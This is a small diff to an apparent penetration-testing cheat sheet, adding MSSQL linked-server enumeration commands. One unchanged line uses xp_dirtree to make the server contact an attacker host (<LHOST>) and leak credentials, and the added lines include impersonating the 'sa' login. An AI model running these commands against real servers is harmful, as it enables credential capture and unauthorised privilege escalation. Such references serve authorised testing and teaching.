@@ -178,6 +178,17 @@ SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 
 ### Linked SQL Server Enumeration
 
+#### Common Commands
+
+```c
+SQL> enum_links
+SQL> EXECUTE('select @@servername, @@version') AT [<RHOST>];
+SQL> use_link [PRIMARY]
+SQL> exec_as_login sa
+```
+
+#### Advanced Enumeration
+
 ```c
 SQL> SELECT user_name();
 SQL> SELECT name,sysadmin FROM syslogins;
